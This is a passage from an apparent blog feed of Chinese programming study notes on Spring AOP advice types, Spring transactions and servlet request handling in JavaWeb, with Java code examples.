Object</li><li>由于无法预知原始方法运行后是否会抛出异常，因此环绕通知方法必须抛出 Throwable 对象</li></ol></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Around</span><span class="token punctuation">(</span><span class="token string">"pt2()"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">aroundSelect</span><span class="token punctuation">(</span><span class="token class-name">ProceedingJoinPoint</span> proceedingJoinPoint<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"before advice ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Integer</span> ret <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">)</span> proceedingJoinPoint<span class="token punctuation">.</span><span class="token function">proceed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"after advice ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ret <span class="token operator">+</span> <span class="token number">566</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="30-案例测量业务层接口万次执行效率"><a class="markdownIt-Anchor" href="#30-案例测量业务层接口万次执行效率">#</a> 30、案例：测量业务层接口万次执行效率</h1><p>需求：任意业务层接口执行均可显示其执行效率（执行时长）</p><ul><li>分析：<ol><li>业务功能：业务层接口执行前后分别记录时间，求差值得到执行效率</li><li>通知类型选择前后均可增强的类型 ——<mark> 环绕通知</mark></li></ol></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Around</span><span class="token punctuation">(</span><span class="token string">"pt2()"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">aroundSelect</span><span class="token punctuation">(</span><span class="token class-name">ProceedingJoinPoint</span> proceedingJoinPoint<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Signature</span> signature <span class="token operator">=</span> proceedingJoinPoint<span class="token punctuation">.</span><span class="token function">getSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过签名获取执行类型（接口名）</span>    signature<span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取类的类型</span>    signature<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    signature<span class="token punctuation">.</span><span class="token function">getDeclaringTypeName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取执行操作名（方法名）</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"before advice ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Integer</span> ret <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">)</span> proceedingJoinPoint<span class="token punctuation">.</span><span class="token function">proceed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//proceed参数放入pjp.getArgs后可使用修改后的参数当实参</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"after advice ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ret <span class="token operator">+</span> <span class="token number">566</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="31-aop通知获取数据"><a class="markdownIt-Anchor" href="#31-aop通知获取数据">#</a> 31、AOP 通知获取数据</h1><ul><li><p>获取参数</p></li><li><p>获取返回值</p></li><li><p>获取异常</p></li><li><p>获取切入点方法的参数</p><ul><li>JoinPoint : 适用于前置、后置、返回后、抛出异常后通知</li><li>ProceedJointPoint: 适用于环绕通知</li></ul></li><li><p>获取切入点方法返回值</p><ul><li>返回后通知</li><li>环绕通知</li></ul></li><li><p>获取切入点方法运行异常信息</p><ul><li>抛出异常后通知</li><li>环绕通知</li></ul></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//获取参数</span><span class="token keyword">public</span> <span class="token keyword">void</span> before <span class="token punctuation">(</span><span class="token class-name">JoinPoint</span> jp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> jp<span class="token punctuation">.</span><span class="token function">getArgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//ProceedingJoinPoint也有这个方法</span><span class="token comment">//afterReturning获取返回值</span><span class="token annotation punctuation">@AfterReturning</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"pt()"</span><span class="token punctuation">,</span>returning <span class="token operator">=</span> <span class="token string">"ret"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterReturning2</span><span class="token punctuation">(</span><span class="token class-name">Object</span> ret<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"afterReturning advice ..."</span> <span class="token operator">+</span> ret<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//jp存在时jp必须是第一个参数</span><span class="token comment">//异常：直接try catch 或注解throwing = "t"，形参给个Throwable T</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220926162247692.png" alt="image-20220926162247692"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220926162301228.png" alt="image-20220926162301228"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220926162309770.png" alt="image-20220926162309770"></p><h1 id="32-aop总结"><a class="markdownIt-Anchor" href="#32-aop总结">#</a> 32、AOP 总结</h1><ul><li>概念︰AOP (Aspect Oriented Programming) 面向切面编程，一种编程范式</li><li>作用︰在不惊动原始设计的基础上为方法进行功能增强</li><li>核心概念<ul><li>代理 (Proxy) : SpringAOP 的核心本质是采用代理模式实现的</li><li>连接点 (JoinPoint) ：在 SpringAOP 中，理解为任意方法的执行</li><li>切入点 (Pointcut) ：匹配连接点的式子，也是具有共性功能的方法描述</li><li>通知 (Advice)：若干个方法的共性功能，在切入点处执行，最终体现为一个方法</li><li>切面 (Aspect)︰描述通知与切入点的对应关系</li><li>目标对象 (Target)︰被代理的原始对象成为目标对象</li></ul></li><li>切入点表达式标准格式︰动作关键字（访问修饰符返回值﹐包名。类 / 接口名。方法名（参数）异常名)<ul><li>execution(* com.itheima.service.*Service.*( …))</li></ul></li><li>切入点表达式描述通配符:<ul><li>作用：用于快速描述，范围描述</li><li>*：匹配任意符号（常用)</li><li>…：匹配多个连续的任意符号（常用)</li><li>+︰匹配子类类型</li></ul></li><li>切入点表达式书写技巧<ol><li>按标准规范开发</li><li>查询操作的返回值建议使用 * 匹配</li><li>减少使用… 的形式描述包</li><li>对接口进行描述，使用 * 表示模块名，例如 UserService 的匹配描述为 * Service</li><li>方法名书写保留动词，例如 get，使用 * 表示名词，例如 getById 匹配描述为 getBy*</li><li>参数根据实际情况灵活调整</li></ol></li><li>通知类型<ul><li>前置通知</li><li>后置通知</li><li>环绕通知（重点）<ul><li>环绕通知依赖形参 ProceedingJoinPoint 才能实现对原始方法的调用（必须在形参第一位）</li><li>环绕通知可以隔离原始方法的调用执行</li><li>环绕通知返回值设置为 Object 类型</li><li>环绕通知中可以对原始方法调用过程中出现的异常进行处理</li></ul></li><li>返回后通知</li><li>抛出异常后通知</li></ul></li><li>获取切入点方法的参数<ul><li>JoinPoint：适用于前置、后置、返回后、抛出异常后通知，设置为方法的第一个形参</li><li>ProceedJoinPoint：适用于环绕通知</li></ul></li><li>获取切入点方法的返回值<ul><li>返回后通知</li><li>环绕通知</li></ul></li><li>获取切入点方法运行异常信息<ul><li>抛出异常后通知</li><li>环绕通知</li></ul></li></ul><h1 id="33-spring事务简介"><a class="markdownIt-Anchor" href="#33-spring事务简介">#</a> 33、Spring 事务简介</h1><ul><li>事务作用：在数据层保障一系列的数据库操作同成功同失败</li><li>Spring 事务作用：在数据层或业务层保障一系列的数据库操作同成功同失败</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">PlatformTransactionManager</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">commit</span><span class="token punctuation">(</span><span class="token class-name">TransactionStatus</span> status<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransactionException</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">rollback</span><span class="token punctuation">(</span><span class="token class-name">TransactionStatus</span> status<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransactionException</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DataSourceTranscantionManager</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="34-案例银行账户转账"><a class="markdownIt-Anchor" href="#34-案例银行账户转账">#</a> 34、案例：银行账户转账</h1><p>需求：实现任意两个账户间转账操作</p><p>需求减缩：A 账户减钱，B 账户加钱</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-课程内容&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-课程内容&quot;&gt;#&lt;/a&gt; 1、课程内容&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Spring&lt;/li&gt;
&lt;li&gt;SpringMVC&lt;/li&gt;
&lt;li&gt;Maven 高级&lt;/li&gt;
&lt;li&gt;</summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb-Request&amp;Response</title>
    <link href="http://example.com/post/JavaWeb-Request-Response.html"/>
    <id>http://example.com/post/JavaWeb-Request-Response.html</id>
    <published>2022-06-23T13:40:26.000Z</published>
    <updated>2022-06-23T13:43:20.587Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-概述"><a class="markdownIt-Anchor" href="#1-概述">#</a> 1、概述</h1><ul><li>Request：<mark>获取</mark>请求数据</li><li>Response：<mark>设置</mark>响应数据</li><li>Request：<ul><li>Request 继承体系</li><li>Request 获取请求数据</li><li>Request 请求转发</li></ul></li></ul><h1 id="2-request继承体系"><a class="markdownIt-Anchor" href="#2-request继承体系">#</a> 2、Request 继承体系</h1><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623155502562.png" alt="image-20220623155502562"></p><ul><li>实现类由 tomcat 提供</li><li>Tomcat 需要解析请求数据，封装为 request 对象，并且创建 request 对象传递到 service 方法中</li><li>使用 request 对象，查阅 JavaEE API 文档的 HttpServletRequest 接口就行，因为 tomcat 是实现这个接口</li><li>Request 对象全名：<mark>org.apache.catalina.connector.RequestFacade@289d4a7</mark></li></ul><h1 id="3-request获取请求数据"><a class="markdownIt-Anchor" href="#3-request获取请求数据">#</a> 3、Request 获取请求数据</h1><h2 id="31-请求行"><a class="markdownIt-Anchor" href="#31-请求行">#</a> 3.1 请求行</h2><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;request-demo&#x2F;req1?username&#x3D;zhangsan HTTP&#x2F;1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>请求方式 资源路径 请求参数 版本</li></ul><table><thead><tr><th>方法</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>String getMethod();</td><td>获取请求方式</td><td>get</td></tr><tr><td>String getContextPath();</td><td>获取虚拟目录（项目访问路径）</td><td>/request-demo</td></tr><tr><td>StringBuffer getRequestURL();</td><td>获取 URL（统一资源定位符）</td><td><a href="http://localhost:8080/request-demo/req1">http://localhost:8080/request-demo/req1</a></td></tr><tr><td>String getRequestURI();</td><td>获取 URI（统一资源标识符）</td><td>/request-demo/req1</td></tr><tr><td>String getQueryString();</td><td>获取请求参数（get 方式）</td><td>username=zhangsan&amp;password=123</td></tr></tbody></table><h2 id="32-请求头"><a class="markdownIt-Anchor" href="#32-请求头">#</a> 3.2 请求头</h2><pre class="line-numbers language-none"><code class="language-none">User-Agent:Mozilla&#x2F;5.0 Chrome&#x2F;91.0.4472.106<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>String getHeader(String name);</td><td>根据请求头名称，获取值</td></tr></tbody></table><h2 id="33-请求体"><a class="markdownIt-Anchor" href="#33-请求体">#</a> 3.3 请求体</h2><pre class="line-numbers language-none"><code class="language-none">username&#x3D;zhangsan&amp;password&#x3D;123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>ServletInputStream getInputStream (); 获取字节输入流 —— <mark>上传文件</mark></li><li>BufferedReader getReader (); 获取字符输入流 —— <mark>纯文本</mark></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>web</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">BufferedReader</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span><span class="token string">"/req-demo2"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletRequestDemo2</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//浏览器的版本信息</span>        <span class="token class-name">String</span> header <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"user-agent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//获取post请求体</span>        <span class="token class-name">BufferedReader</span> reader <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//读取数据</span>        <span class="token class-name">String</span> s <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="34-通用方式获取请求参数"><a class="markdownIt-Anchor" href="#34-通用方式获取请求参数">#</a> 3.4 通用方式获取请求参数</h2><ul><li>请求参数获取方式：<ul><li>GET 方式： <code>String getQueryString()</code></li><li>POST 方式： <code>BufferedReader getReader()</code></li></ul></li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623205518967.png" alt="image-20220623205518967"></p><ul><li>Map&lt;String, String []&gt; getParameterMap (): 获取所有参数 Map 集合</li><li>String [] getParameterValues (String name): 根据名称获取参数值 (数组)</li><li>String getParameter (String name): 根据名称获取参数值 (单个值)</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>web</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span><span class="token string">"/req-demo3"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletRequestDemo3</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//GET请求逻辑</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"get..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//1.获取所有参数的map集合</span>        <span class="token class-name">Map</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> parameterMap <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> key <span class="token operator">:</span> parameterMap<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//获取值</span>            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> values <span class="token operator">=</span> parameterMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> value <span class="token operator">:</span> values<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>value <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取数组</span>        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> parameterValues <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span><span class="token string">"hobby"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> parameterValue <span class="token operator">:</span> parameterValues<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>parameterValue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//根据key获取单个参数值</span>        <span class="token class-name">String</span> parameter <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"hobby"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> uusername <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>parameter<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>uusername<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//post请求逻辑</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">doGet</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span>resp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><mark>最常用的就是 getParameter</mark></li></ul><h2 id="35-请求参数中文乱码处理"><a class="markdownIt-Anchor" href="#35-请求参数中文乱码处理">#</a> 3.5 请求参数中文乱码处理</h2><ol><li>POST</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//在前面加一行</span>req<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置字符输入流的编码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>GET</li></ol><ul><li>get 获取参数的方式：getQueryString</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623212517551.png" alt="image-20220623212517551"></p><ul><li>做法：将解码后的数据再变成字节数据，再将字节数据使用 UTF-8 解码</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> username<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token string">"ISO-8859-1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>username <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-概述&quot;&gt;#&lt;/a&gt; 1、概述&lt;/h1&gt;
&lt;ul&gt;
